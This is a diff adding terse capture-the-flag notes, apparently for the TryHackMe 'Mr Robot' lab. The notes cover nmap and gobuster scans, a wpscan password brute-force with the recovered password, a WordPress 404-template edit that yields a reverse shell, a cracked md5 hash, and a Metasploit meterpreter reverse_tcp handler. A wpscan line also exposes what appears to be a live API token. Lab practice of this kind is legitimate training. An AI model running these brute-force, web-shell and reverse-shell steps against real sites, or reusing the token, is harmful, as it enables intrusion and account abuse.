@@ -1,0 +1,24 @@
+nmap -sC -sV -Pn 10.10.38.232 > nmap.txt
+nmap -p- 10.10.38.232 > nmapall.txt
+
+whoisrobot.com
+
+
+gobuster dir  -u http://whoisrobot.com/  -w /usr/share/dirb/wordlists/common.txt -x txt,php,py,cgi > gobuster.txt
+
+1.使用ZAP Fuzz用戶發現Elliot是有效用戶
+2.使用wpscan指定用戶名暴力破解,取得密碼ER28-0652
+wpscan --url whoisrobot.com --usernames Elliot --passwords /home/kali/timmy/TryHackMe/Mr_Robot/fsocity.dic --max-threads 50
+3.登入Theme頁面可以編輯404報錯頁面，改為reverse.php 重新訪問404頁面取得reverse shell
+4.在robot木立下查找到md5密碼
+c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
+
+
+wpscan --url http://whoisrobot.com/ --disable-tls-checks --enumerate vp --api-token yebWdQNmyXU7oApKQatIaLPe5NL0EkYTjuSunpp5DIU
+
+
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST tun0
+sysinfo
